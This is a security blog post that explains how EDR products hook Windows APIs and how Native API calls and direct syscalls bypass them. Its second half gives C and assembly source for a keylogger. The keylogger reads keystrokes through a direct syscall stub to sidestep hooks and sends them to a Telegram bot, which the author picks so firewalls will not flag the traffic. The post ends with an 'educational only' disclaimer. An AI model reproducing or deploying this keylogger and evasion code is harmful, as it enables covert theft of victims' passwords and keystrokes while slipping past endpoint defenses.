---
title: "Syscalls — EDR evasion p1 (optional)"
date: 2024-07-31
draft: false
tags: ["cybersecurity", "edr", "reverse engineering", "malware", "windows internals"]
categories: ["blog"]
---

### What is User mode API-Hooking in EDR?

Imagine you’ve just got some great deals at a newly opened supermarket and are heading home with your transparent shopping bag. As you stroll by the neighborhood grocer, he peeks into your bag to see what you’ve bought. If he spots something he already stocks (something sus), he stops you and won’t let you pass.  


User-mode API hooking allows EDRs to dynamically inspect code executed within the context of Windows APIs or Native APIs for potentially malicious content or behavior. There are various types of hooking, with most vendors using the inline hooking method. This method replaces a specific `mov` instruction—more specifically, the `mov` opcode and the `eax` SSN operands—with a 5-byte `jmp` instruction. The `mov` instruction typically moves the syscall number or system service number (SSN) to the `eax` register. The unconditional `jmp` instruction redirects to the EDR's hooking DLL, allowing the EDR to examine the code executed within the context of the Native API for potentially malicious content.

![Alt text](/images/syscall1.webp)
---

### What is Windows API?

Imagine you’re at a Turkish restaurant, and you’ve got a craving for lahmacun. Now, the Windows API is like the friendly waiter at this restaurant. When you want to order lahmacun (or any other dish), you don’t need to go into the kitchen yourself. You just tell the waiter what you want.

So, you say, “I’d like to order lahmacun, please!” The waiter (Windows API) takes your order and communicates it to the kitchen (the operating system). The kitchen staff (kernel and hardware) then prepare your lahmacun just the way you like it.


Let’s say you want your application to create a file. To do that, you need to use the documented Windows API function `CreateFileW` in your code. Implementing this is straightforward, thanks to Microsoft's documentation.

![Alt text](/images/syscall2.webp)

To perform the save operation in the context of the user-mode process `notepad.exe`, the first step involves accessing `kernel32.dll` and calling the Windows API `WriteFile`. In the second step, `kernel32.dll` accesses `Kernelbase.dll`. In the third step, `WriteFile` accesses the Native API `NtCreateFile` through `ntdll.dll`.

---

### What is Native API?

This time, instead of talking to the waiter, you ask to speak directly with the head chef. The head chef (Native API) knows all the secrets and special techniques for making lahmacun. This is like using the Native API: it gives you more control and access to features the regular waiter might not handle.

The Native API is a set of undocumented functions provided by Windows, implemented in `ntdll.dll`, used internally by higher-level APIs to perform system operations.

![Alt text](/images/syscall3.webp)

> Some nerds have reverse-engineered these functions, allowing you to use undocumented NT functions in your code.

🔗 [NTAPI Undocumented Functions](https://web.archive.org)

---

### Direct Syscalls

Now you’re feeling even more adventurous. You walk directly into the kitchen and tell the sous-chef how to cook it. This is like a direct syscall — you skip the APIs and go straight to the kernel.

A direct syscall is a low-level way for programs to request services directly from the OS kernel, bypassing higher-level abstractions.

---


#### Keylogger

Example: A keylogger using Native API and syscalls, sending keystrokes to a Telegram bot.

```c
extern SHORT NtUserGetAsyncKeyState(
    IN INT vKey
);
```

Syscall assembly stub:

```c
.code
NtUserGetAsyncKeyState PROC
    mov r10, rcx
    mov eax, 1044h
    syscall
    ret
NtUserGetAsyncKeyState ENDP
end
```

To find the syscall SSN, debug the app and search for syscall instruction
Or use: https://j00ru.vexillium.org/syscalls/win32k/64/

![Alt text](/images/syscall4.webp)

Logging logic:

```c
void appendToKeystrokes(char character) {
    if (keystrokesSize + 1 >= BUFFER_SIZE) {
        sendToTgBot(keystrokes);
        keystrokesSize = 0;
        keystrokes[0] = '\0';
    }
    keystrokes[keystrokesSize++] = character;
    keystrokes[keystrokesSize] = '\0';
}
```

```c
VOID KeyboardClicksLogger() {
    SHORT state = NULL;
    if (LoadLibraryA("WIN32U.DLL") == NULL) {
        printf("[!] LoadLibraryA Failed\n");
        return;
    }

    while (TRUE) {
        Sleep(10);
        for (int i = 33; i < 255; i++) {
            state = (SHORT)NtUserGetAsyncKeyState((DWORD)i);
            if (state == 1 || state == -32767) {
                if ((7 < i) && (120 < i || i < 143)) {
                    printf("\\x%02X", i);
                    appendToKeystrokes((char)i);
                }
            }
        }
        state = (SHORT)NtUserGetAsyncKeyState(VK_SPACE);
        if (state == 1 || state == -32767) {
            printf(" ");
            appendToKeystrokes(' ');
        }
        state = (SHORT)NtUserGetAsyncKeyState(VK_RETURN);
        if (state == 1 || state == -32767) {
            printf("\n");
            appendToKeystrokes('\n');
        }
    }
}
```

```c
int main() {
    HANDLE hThread = NULL;
    DWORD dwThreadId = NULL;

    keystrokes = (char*)malloc(BUFFER_SIZE);
    if (keystrokes == NULL) return 1;
    keystrokes[0] = '\0';

    hThread = CreateThread(NULL, NULL, (LPTHREAD_START_ROUTINE)KeyboardClicksLogger, NULL, NULL, &dwThreadId);
    if (hThread) {
        printf("[i] Thread %d Created\n", dwThreadId);
        WaitForSingleObject(hThread, INFINITE);
    }

    if (keystrokes != NULL) free(keystrokes);
    return 0;
}
```
Sending Logs?

    Of course, we use Telegram — so it won’t be sussy for the firewall.

Let’s test the code and see if it works.
![Alt text](/images/syscall5.webp)
![Alt text](/images/syscall6.webp)

🛡️ Does it evade EDR? Probably not. You need more advanced methods to fully bypass.
🧠 This is educational only — don't use it to steal your friends’ passwords.

![Alt text](/images/syscall7.webp)
🔗 GitHub: https://github.com/nol4ns3c/harach/blob/main/konsey-uyesi%20(syscall)

